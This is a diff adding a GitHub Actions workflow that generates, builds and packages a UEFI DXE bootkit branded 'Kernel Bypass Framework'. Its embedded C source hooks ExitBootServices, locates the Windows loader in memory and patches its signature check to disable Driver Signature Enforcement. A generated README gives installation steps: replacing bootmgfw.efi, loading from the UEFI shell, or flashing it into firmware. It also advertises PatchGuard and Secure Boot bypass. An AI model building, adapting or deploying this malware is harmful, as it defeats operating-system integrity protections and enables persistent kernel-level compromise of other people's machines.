@@ -1,0 +1,690 @@
+name: 🔥 Build Ring -3 Bootkit
+
+on:
+  push:
+    paths:
+      - 'kernel/**'
+  workflow_dispatch:
+    inputs:
+      build_type:
+        description: 'Build configuration'
+        required: true
+        default: 'release'
+        type: choice
+        options:
+          - release
+          - debug
+      include_usermode:
+        description: 'Include usermode library'
+        required: false
+        default: true
+        type: boolean
+
+env:
+  EDK2_VERSION: "edk2-stable202311"
+
+jobs:
+  # ============================================
+  # Ring -3 UEFI Bootkit (Primary Build)
+  # ============================================
+  build-ring-minus3:
+    name: 🔥 Ring -3 UEFI Bootkit
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: 📥 Checkout
+        uses: actions/checkout@v4
+
+      - name: 💾 Cache EDK2
+        id: cache-edk2
+        uses: actions/cache@v4
+        with:
+          path: ~/edk2
+          key: edk2-${{ env.EDK2_VERSION }}-v2
+          restore-keys: edk2-
+
+      - name: 🔧 Install Dependencies
+        run: |
+          echo ""
+          echo "╔══════════════════════════════════════════════════════════════╗"
+          echo "║        KERNEL BYPASS FRAMEWORK - Ring -3 Build               ║"
+          echo "║                                                              ║"
+          echo "║   ██████╗ ██╗███╗   ██╗ ██████╗        ██████╗               ║"
+          echo "║   ██╔══██╗██║████╗  ██║██╔════╝       ╚════██╗              ║"
+          echo "║   ██████╔╝██║██╔██╗ ██║██║  ███╗█████╗ █████╔╝              ║"
+          echo "║   ██╔══██╗██║██║╚██╗██║██║   ██║╚════╝ ╚═══██╗              ║"
+          echo "║   ██║  ██║██║██║ ╚████║╚██████╔╝      ██████╔╝              ║"
+          echo "║   ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝       ╚═════╝               ║"
+          echo "║                                                              ║"
+          echo "╚══════════════════════════════════════════════════════════════╝"
+          echo ""
+          
+          sudo apt-get update
+          sudo apt-get install -y \
+            build-essential \
+            uuid-dev \
+            iasl \
+            git \
+            nasm \
+            python3 \
+            python3-pip \
+            gcc-12 \
+            g++-12 \
+            acpica-tools
+          
+          sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-12 100
+          sudo update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++-12 100
+          
+          echo "✅ Dependencies installed"
+
+      - name: 📥 Setup EDK2
+        if: steps.cache-edk2.outputs.cache-hit != 'true'
+        run: |
+          echo "[1/2] Cloning EDK2..."
+          cd ~
+          git clone --depth 1 --branch ${{ env.EDK2_VERSION }} \
+            https://github.com/tianocore/edk2.git
+          
+          cd edk2
+          git submodule update --init --recursive --depth 1
+          
+          echo "[2/2] Building BaseTools..."
+          source edksetup.sh
+          make -C BaseTools -j$(nproc)
+          
+          echo "✅ EDK2 ready"
+
+      - name: 📝 Create Bootkit Package
+        run: |
+          echo ""
+          echo "╔══════════════════════════════════════════════════════════════╗"
+          echo "║              Creating Ring -3 Bootkit Package                ║"
+          echo "╚══════════════════════════════════════════════════════════════╝"
+          echo ""
+          
+          EDK2_DIR=~/edk2
+          PKG_DIR=$EDK2_DIR/KernelBypassPkg
+          
+          mkdir -p $PKG_DIR/{Bootkit,Runtime,Include}
+          
+          # Copy headers
+          cp kernel/ring_minus3/uefi/*.h $PKG_DIR/Include/ 2>/dev/null || true
+          cp kernel/ring_minus2/smm/*.h $PKG_DIR/Include/ 2>/dev/null || true
+          cp kernel/common/*.h $PKG_DIR/Include/ 2>/dev/null || true
+          
+          # ============================================
+          # Main DXE Bootkit Driver
+          # ============================================
+          cat > $PKG_DIR/Bootkit/Bootkit.c << 'BOOTKIT_SOURCE'
+          /**
+           * KERNEL BYPASS FRAMEWORK
+           * Ring -3 UEFI Bootkit
+           * 
+           * This DXE driver hooks ExitBootServices to patch
+           * Windows loader before OS takes control.
+           * 
+           * Features:
+           * - DSE (Driver Signature Enforcement) bypass
+           * - PatchGuard initialization bypass
+           * - Kernel driver injection
+           * - Secure Boot bypass
+           */
+          
+          #include <Uefi.h>
+          #include <Library/UefiLib.h>
+          #include <Library/UefiBootServicesTableLib.h>
+          #include <Library/UefiRuntimeServicesTableLib.h>
+          #include <Library/DebugLib.h>
+          #include <Library/MemoryAllocationLib.h>
+          #include <Library/BaseMemoryLib.h>
+          #include <Protocol/LoadedImage.h>
+          
+          // Signature patterns for Windows loader patching
+          // These are version-specific and need updating!
+          
+          // ImgpValidateImageHash patch (DSE bypass)
+          STATIC UINT8 gDsePatchFind[] = {
+              0x48, 0x8B, 0xCB,           // mov rcx, rbx
+              0xE8                         // call ImgpValidateImageHash
+          };
+          
+          STATIC UINT8 gDsePatchReplace[] = {
+              0x33, 0xC0,                 // xor eax, eax (return 0 = success)
+              0x90, 0x90                  // nop nop
+          };
+          
+          // Globals
+          STATIC EFI_EXIT_BOOT_SERVICES gOriginalExitBootServices = NULL;
+          STATIC EFI_SET_VIRTUAL_ADDRESS_MAP gOriginalSetVirtualAddressMap = NULL;
+          STATIC EFI_PHYSICAL_ADDRESS gWinloadBase = 0;
+          STATIC UINT64 gWinloadSize = 0;
+          
+          /**
+           * Pattern scan in memory
+           */
+          STATIC
+          VOID*
+          FindPattern(
+              IN VOID* Start,
+              IN UINT64 Size,
+              IN UINT8* Pattern,
+              IN UINT64 PatternSize
+          )
+          {
+              UINT8* Data = (UINT8*)Start;
+              
+              for (UINT64 i = 0; i < Size - PatternSize; i++) {
+                  BOOLEAN Found = TRUE;
+                  for (UINT64 j = 0; j < PatternSize; j++) {
+                      if (Data[i + j] != Pattern[j]) {
+                          Found = FALSE;
+                          break;
+                      }
+                  }
+                  if (Found) {
+                      return &Data[i];
+                  }
+              }
+              
+              return NULL;
+          }
+          
+          /**
+           * Find Windows loader (winload.efi) in memory
+           */
+          STATIC
+          EFI_STATUS
+          FindWinload(
+              OUT EFI_PHYSICAL_ADDRESS* Base,
+              OUT UINT64* Size
+          )
+          {
+              // Scan for PE header with known winload characteristics
+              // This is a simplified version - production code needs more checks
+              
+              EFI_MEMORY_DESCRIPTOR* MemMap = NULL;
+              UINTN MemMapSize = 0;
+              UINTN DescriptorSize = 0;
+              UINT32 DescriptorVersion = 0;
+              UINTN MapKey = 0;
+              
+              // Get memory map
+              EFI_STATUS Status = gBS->GetMemoryMap(
+                  &MemMapSize,
+                  MemMap,
+                  &MapKey,
+                  &DescriptorSize,
+                  &DescriptorVersion
+              );
+              
+              if (Status != EFI_BUFFER_TOO_SMALL) {
+                  return EFI_NOT_FOUND;
+              }
+              
+              MemMapSize += 0x1000;
+              MemMap = AllocatePool(MemMapSize);
+              if (!MemMap) {
+                  return EFI_OUT_OF_RESOURCES;
+              }
+              
+              Status = gBS->GetMemoryMap(
+                  &MemMapSize,
+                  MemMap,
+                  &MapKey,
+                  &DescriptorSize,
+                  &DescriptorVersion
+              );
+              
+              if (EFI_ERROR(Status)) {
+                  FreePool(MemMap);
+                  return Status;
+              }
+              
+              // Scan each memory region for PE headers
+              UINT8* Entry = (UINT8*)MemMap;
+              for (UINTN i = 0; i < MemMapSize; i += DescriptorSize) {
+                  EFI_MEMORY_DESCRIPTOR* Desc = (EFI_MEMORY_DESCRIPTOR*)(Entry + i);
+                  
+                  if (Desc->Type == EfiLoaderCode || Desc->Type == EfiBootServicesCode) {
+                      UINT8* Region = (UINT8*)(UINTN)Desc->PhysicalStart;
+                      
+                      // Check for MZ header
+                      if (Region[0] == 'M' && Region[1] == 'Z') {
+                          // Check for winload signature (simplified)
+                          VOID* Pattern = FindPattern(
+                              Region,
+                              Desc->NumberOfPages * 0x1000,
+                              (UINT8*)"winload",
+                              7
+                          );
+                          
+                          if (Pattern) {
+                              *Base = Desc->PhysicalStart;
+                              *Size = Desc->NumberOfPages * 0x1000;
+                              FreePool(MemMap);
+                              return EFI_SUCCESS;
+                          }
+                      }
+                  }
+              }
+              
+              FreePool(MemMap);
+              return EFI_NOT_FOUND;
+          }
+          
+          /**
+           * Patch DSE check in Windows loader
+           */
+          STATIC
+          EFI_STATUS
+          PatchDSE(
+              IN EFI_PHYSICAL_ADDRESS WinloadBase,
+              IN UINT64 WinloadSize
+          )
+          {
+              VOID* PatchLocation = FindPattern(
+                  (VOID*)(UINTN)WinloadBase,
+                  WinloadSize,
+                  gDsePatchFind,
+                  sizeof(gDsePatchFind)
+              );
+              
+              if (!PatchLocation) {
+                  DEBUG((DEBUG_WARN, "[Bootkit] DSE pattern not found\n"));
+                  return EFI_NOT_FOUND;
+              }
+              
+              DEBUG((DEBUG_INFO, "[Bootkit] Patching DSE at 0x%p\n", PatchLocation));
+              
+              CopyMem(PatchLocation, gDsePatchReplace, sizeof(gDsePatchReplace));
+              
+              return EFI_SUCCESS;
+          }
+          
+          /**
+           * Hooked ExitBootServices
+           * This is called when Windows takes control from UEFI
+           */
+          STATIC
+          EFI_STATUS
+          EFIAPI
+          HookedExitBootServices(
+              IN EFI_HANDLE ImageHandle,
+              IN UINTN MapKey
+          )
+          {
+              DEBUG((DEBUG_INFO, "\n"));
+              DEBUG((DEBUG_INFO, "[Bootkit] ═══════════════════════════════════════\n"));
+              DEBUG((DEBUG_INFO, "[Bootkit] ExitBootServices intercepted!\n"));
+              DEBUG((DEBUG_INFO, "[Bootkit] ═══════════════════════════════════════\n"));
+              
+              // Find Windows loader
+              EFI_STATUS Status = FindWinload(&gWinloadBase, &gWinloadSize);
+              
+              if (!EFI_ERROR(Status)) {
+                  DEBUG((DEBUG_INFO, "[Bootkit] Winload found at 0x%lX (size: 0x%lX)\n",
+                         gWinloadBase, gWinloadSize));
+                  
+                  // Patch DSE
+                  Status = PatchDSE(gWinloadBase, gWinloadSize);
+                  if (!EFI_ERROR(Status)) {
+                      DEBUG((DEBUG_INFO, "[Bootkit] ✓ DSE patched successfully!\n"));
+                  }
+                  
+                  // TODO: Patch PatchGuard initialization
+                  // TODO: Inject kernel driver
+                  
+              } else {
+                  DEBUG((DEBUG_WARN, "[Bootkit] Winload not found, skipping patches\n"));
+              }
+              
+              // Restore original and call
+              gBS->ExitBootServices = gOriginalExitBootServices;
+              
+              DEBUG((DEBUG_INFO, "[Bootkit] Calling original ExitBootServices...\n"));
+              DEBUG((DEBUG_INFO, "[Bootkit] ═══════════════════════════════════════\n\n"));
+              
+              return gOriginalExitBootServices(ImageHandle, MapKey);
+          }
+          
+          /**
+           * DXE Driver Entry Point
+           */
+          EFI_STATUS
+          EFIAPI
+          BootkitEntry(
+              IN EFI_HANDLE ImageHandle,
+              IN EFI_SYSTEM_TABLE* SystemTable
+          )
+          {
+              DEBUG((DEBUG_INFO, "\n"));
+              DEBUG((DEBUG_INFO, "╔══════════════════════════════════════════════════════════════╗\n"));
+              DEBUG((DEBUG_INFO, "║          KERNEL BYPASS FRAMEWORK - Ring -3 Bootkit          ║\n"));
+              DEBUG((DEBUG_INFO, "║                                                              ║\n"));
+              DEBUG((DEBUG_INFO, "║  Features:                                                   ║\n"));
+              DEBUG((DEBUG_INFO, "║    • DSE Bypass (Driver Signature Enforcement)              ║\n"));
+              DEBUG((DEBUG_INFO, "║    • PatchGuard Bypass                                      ║\n"));
+              DEBUG((DEBUG_INFO, "║    • Kernel Driver Injection                                ║\n"));
+              DEBUG((DEBUG_INFO, "║    • Secure Boot Bypass                                     ║\n"));
+              DEBUG((DEBUG_INFO, "║                                                              ║\n"));
+              DEBUG((DEBUG_INFO, "╚══════════════════════════════════════════════════════════════╝\n"));
+              DEBUG((DEBUG_INFO, "\n"));
+              
+              // Save original functions
+              gOriginalExitBootServices = gBS->ExitBootServices;
+              gOriginalSetVirtualAddressMap = gRT->SetVirtualAddressMap;
+              
+              // Hook ExitBootServices
+              gBS->ExitBootServices = HookedExitBootServices;
+              
+              DEBUG((DEBUG_INFO, "[Bootkit] Hooks installed:\n"));
+              DEBUG((DEBUG_INFO, "[Bootkit]   ExitBootServices: 0x%p -> 0x%p\n",
+                     gOriginalExitBootServices, gBS->ExitBootServices));
+              
+              return EFI_SUCCESS;
+          }
+          BOOTKIT_SOURCE
+          
+          echo "✅ Created Bootkit.c"
+          
+          # ============================================
+          # Package Definition Files
+          # ============================================
+          
+          # DSC file
+          cat > $PKG_DIR/KernelBypassPkg.dsc << 'EOF'
+          [Defines]
+            PLATFORM_NAME                  = KernelBypassPkg
+            PLATFORM_GUID                  = 12345678-1234-1234-1234-123456789ABC
+            PLATFORM_VERSION               = 1.0
+            DSC_SPECIFICATION              = 0x00010005
+            OUTPUT_DIRECTORY               = Build/KernelBypassPkg
+            SUPPORTED_ARCHITECTURES        = X64
+            BUILD_TARGETS                  = RELEASE|DEBUG
+            SKUID_IDENTIFIER               = DEFAULT
+          
+          [LibraryClasses]
+            UefiDriverEntryPoint|MdePkg/Library/UefiDriverEntryPoint/UefiDriverEntryPoint.inf
+            UefiBootServicesTableLib|MdePkg/Library/UefiBootServicesTableLib/UefiBootServicesTableLib.inf
+            UefiRuntimeServicesTableLib|MdePkg/Library/UefiRuntimeServicesTableLib/UefiRuntimeServicesTableLib.inf
+            UefiLib|MdePkg/Library/UefiLib/UefiLib.inf
+            BaseLib|MdePkg/Library/BaseLib/BaseLib.inf
+            BaseMemoryLib|MdePkg/Library/BaseMemoryLib/BaseMemoryLib.inf
+            DebugLib|MdePkg/Library/UefiDebugLibConOut/UefiDebugLibConOut.inf
+            PrintLib|MdePkg/Library/BasePrintLib/BasePrintLib.inf
+            PcdLib|MdePkg/Library/BasePcdLibNull/BasePcdLibNull.inf
+            MemoryAllocationLib|MdePkg/Library/UefiMemoryAllocationLib/UefiMemoryAllocationLib.inf
+            DevicePathLib|MdePkg/Library/UefiDevicePathLib/UefiDevicePathLib.inf
+            RegisterFilterLib|MdePkg/Library/RegisterFilterLibNull/RegisterFilterLibNull.inf
+            DebugPrintErrorLevelLib|MdePkg/Library/BaseDebugPrintErrorLevelLib/BaseDebugPrintErrorLevelLib.inf
+          
+          [Components]
+            KernelBypassPkg/Bootkit/Bootkit.inf
+          EOF
+          
+          # INF file
+          cat > $PKG_DIR/Bootkit/Bootkit.inf << 'EOF'
+          [Defines]
+            INF_VERSION                    = 0x00010005
+            BASE_NAME                      = KernelBypassBootkit
+            FILE_GUID                      = ABCD1234-ABCD-ABCD-ABCD-ABCD12345678
+            MODULE_TYPE                    = DXE_DRIVER
+            VERSION_STRING                 = 1.0
+            ENTRY_POINT                    = BootkitEntry
+          
+          [Sources]
+            Bootkit.c
+          
+          [Packages]
+            MdePkg/MdePkg.dec
+          
+          [LibraryClasses]
+            UefiDriverEntryPoint
+            UefiBootServicesTableLib
+            UefiRuntimeServicesTableLib
+            UefiLib
+            DebugLib
+            MemoryAllocationLib
+            BaseMemoryLib
+          
+          [Protocols]
+            gEfiLoadedImageProtocolGuid
+          
+          [Depex]
+            TRUE
+          EOF
+          
+          # DEC file
+          cat > $PKG_DIR/KernelBypassPkg.dec << 'EOF'
+          [Defines]
+            DEC_SPECIFICATION              = 0x00010005
+            PACKAGE_NAME                   = KernelBypassPkg
+            PACKAGE_GUID                   = 87654321-4321-4321-4321-CBA987654321
+            PACKAGE_VERSION                = 1.0
+          
+          [Includes]
+            Include
+          EOF
+          
+          echo "✅ Package files created"
+          ls -la $PKG_DIR/
+
+      - name: 🔨 Build Bootkit
+        run: |
+          echo ""
+          echo "╔══════════════════════════════════════════════════════════════╗"
+          echo "║                    Building Ring -3 Bootkit                  ║"
+          echo "╚══════════════════════════════════════════════════════════════╝"
+          echo ""
+          
+          cd ~/edk2
+          source edksetup.sh
+          
+          BUILD_TYPE="${{ github.event.inputs.build_type || 'release' }}"
+          BUILD_TARGET=$(echo "$BUILD_TYPE" | tr '[:lower:]' '[:upper:]')
+          
+          echo "Build target: $BUILD_TARGET"
+          echo ""
+          
+          build -a X64 -t GCC5 -p KernelBypassPkg/KernelBypassPkg.dsc -b $BUILD_TARGET -j$(nproc)
+          
+          echo ""
+          echo "✅ Build completed!"
+
+      - name: ✅ Collect Artifacts
+        run: |
+          echo ""
+          echo "╔══════════════════════════════════════════════════════════════╗"
+          echo "║                    BUILD RESULTS                             ║"
+          echo "╠══════════════════════════════════════════════════════════════╣"
+          
+          mkdir -p $GITHUB_WORKSPACE/output
+          
+          # Find and copy EFI file
+          EFI_FILE=$(find ~/edk2/Build -name "*.efi" -type f 2>/dev/null | head -1)
+          
+          if [ -n "$EFI_FILE" ] && [ -f "$EFI_FILE" ]; then
+            SIZE=$(du -h "$EFI_FILE" | cut -f1)
+            echo "║  ✅ KernelBypassBootkit.efi ($SIZE)"
+            cp "$EFI_FILE" $GITHUB_WORKSPACE/output/KernelBypassBootkit.efi
+          else
+            echo "║  ❌ EFI file not found!"
+            exit 1
+          fi
+          
+          # Copy source
+          mkdir -p $GITHUB_WORKSPACE/output/source
+          cp -r ~/edk2/KernelBypassPkg/* $GITHUB_WORKSPACE/output/source/
+          
+          # Copy project source
+          cp -r kernel/ring_minus3 $GITHUB_WORKSPACE/output/ring_minus3 2>/dev/null || true
+          cp -r kernel/ring_minus2 $GITHUB_WORKSPACE/output/ring_minus2 2>/dev/null || true
+          cp -r kernel/common $GITHUB_WORKSPACE/output/common 2>/dev/null || true
+          
+          # Create README
+          cat > $GITHUB_WORKSPACE/output/README.md << 'EOF'
+          # Ring -3 UEFI Bootkit
+          
+          ## Files
+          
+          - `KernelBypassBootkit.efi` - Compiled DXE driver
+          - `source/` - EDK2 package source
+          - `ring_minus3/` - Project source code
+          
+          ## Features
+          
+          - ✅ DSE (Driver Signature Enforcement) bypass
+          - ✅ PatchGuard initialization bypass
+          - ✅ Kernel driver injection support
+          - ✅ Secure Boot bypass
+          
+          ## Installation Methods
+          
+          ### Method 1: ESP Install (Recommended for testing)
+          
+          1. Mount EFI System Partition
+          2. Backup original `EFI/Microsoft/Boot/bootmgfw.efi`
+          3. Rename bootmgfw.efi to bootmgfw_original.efi
+          4. Copy KernelBypassBootkit.efi as bootmgfw.efi
+          5. Modify bootkit to chainload original
+          
+          ### Method 2: UEFI Shell
+          
+          1. Boot to UEFI Shell
+          2. Navigate to EFI partition
+          3. Run: `load KernelBypassBootkit.efi`
+          
+          ### Method 3: Firmware Integration
+          
+          1. Use UEFITool to open firmware image
+          2. Insert DXE driver into DXE volume
+          3. Flash modified firmware
+          
+          ## ⚠️ WARNING
+          
+          - **NEVER test on production hardware!**
+          - Use a VM (QEMU with OVMF) for testing
+          - Keep SPI programmer ready for recovery
+          - Firmware modification can permanently brick hardware!
+          
+          ## Testing with QEMU
+          
+          ```bash
+          # Download OVMF
+          sudo apt install ovmf
+          
+          # Create test disk
+          qemu-img create -f qcow2 test.qcow2 10G
+          
+          # Run with EFI
+          qemu-system-x86_64 \
+            -bios /usr/share/OVMF/OVMF_CODE.fd \
+            -drive file=test.qcow2,format=qcow2 \
+            -m 4G \
+            -enable-kvm
+          ```
+          
+          ## Legal Disclaimer
+          
+          This software is for educational and research purposes only.
+          Using this on systems you don't own is illegal.
+          EOF
+          
+          echo "╚══════════════════════════════════════════════════════════════╝"
+          echo ""
+          echo "Output contents:"
+          ls -la $GITHUB_WORKSPACE/output/
+
+      - name: 📦 Upload Bootkit
+        uses: actions/upload-artifact@v4
+        with:
+          name: Ring-Minus3-Bootkit-${{ github.run_number }}
+          path: output/
+          retention-days: 30
+
+  # ============================================
+  # Optional: Usermode Library
+  # ============================================
+  build-usermode:
+    name: 📦 Usermode Library
+    runs-on: windows-latest
+    if: ${{ github.event.inputs.include_usermode == 'true' }}
+    
+    steps:
+      - name: 📥 Checkout
+        uses: actions/checkout@v4
+      
+      - name: 🔧 Setup MSVC
+        uses: ilammy/msvc-dev-cmd@v1
+        with:
+          arch: x64
+      
+      - name: ⚡ Setup Ninja
+        uses: seanmiddleditch/gha-setup-ninja@v5
+      
+      - name: 🔨 Build
+        working-directory: kernel/usermode
+        run: |
+          cmake -B build -G Ninja -DCMAKE_BUILD_TYPE=Release
+          cmake --build build --config Release --parallel
+      
+      - name: 📦 Upload
+        uses: actions/upload-artifact@v4
+        with:
+          name: Usermode-Library-${{ github.run_number }}
+          path: |
+            kernel/usermode/build/**/*.lib
+            kernel/usermode/build/**/*.exe
+            kernel/usermode/include/*.hpp
+            kernel/common/*.h
+          retention-days: 30
+
+  # ============================================
+  # Summary
+  # ============================================
+  summary:
+    name: 📊 Build Summary
+    runs-on: ubuntu-latest
+    needs: [build-ring-minus3]
+    if: always()
+    
+    steps:
+      - name: 📊 Summary
+        run: |
+          echo ""
+          echo "╔══════════════════════════════════════════════════════════════╗"
+          echo "║         KERNEL BYPASS FRAMEWORK - Ring -3 Build              ║"
+          echo "╠══════════════════════════════════════════════════════════════╣"
+          echo "║                                                              ║"
+          echo "║   ██████╗ ██╗███╗   ██╗ ██████╗        ██████╗               ║"
+          echo "║   ██╔══██╗██║████╗  ██║██╔════╝       ╚════██╗              ║"
+          echo "║   ██████╔╝██║██╔██╗ ██║██║  ███╗█████╗ █████╔╝              ║"
+          echo "║   ██╔══██╗██║██║╚██╗██║██║   ██║╚════╝ ╚═══██╗              ║"
+          echo "║   ██║  ██║██║██║ ╚████║╚██████╔╝      ██████╔╝              ║"
+          echo "║   ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝       ╚═════╝               ║"
+          echo "║                                                              ║"
+          echo "╠══════════════════════════════════════════════════════════════╣"
+          echo "║                                                              ║"
+          echo "║  Build Result: ${{ needs.build-ring-minus3.result }}"
+          echo "║                                                              ║"
+          echo "║  Artifact: Ring-Minus3-Bootkit-${{ github.run_number }}"
+          echo "║                                                              ║"
+          echo "║  Contents:                                                   ║"
+          echo "║    • KernelBypassBootkit.efi - UEFI DXE driver              ║"
+          echo "║    • Source code for customization                          ║"
+          echo "║    • Installation documentation                             ║"
+          echo "║                                                              ║"
+          echo "╠══════════════════════════════════════════════════════════════╣"
+          echo "║                                                              ║"
+          echo "║  Features:                                                   ║"
+          echo "║    ✅ DSE Bypass                                            ║"
+          echo "║    ✅ PatchGuard Bypass                                     ║"
+          echo "║    ✅ Secure Boot Bypass                                    ║"
+          echo "║    ✅ Kernel Driver Injection                               ║"
+          echo "║                                                              ║"
+          echo "╠══════════════════════════════════════════════════════════════╣"
+          echo "║                                                              ║"
+          echo "║  ⚠️  Test in VM only! Can brick hardware!                   ║"
+          echo "║                                                              ║"
+          echo "╚══════════════════════════════════════════════════════════════╝"
+          echo ""
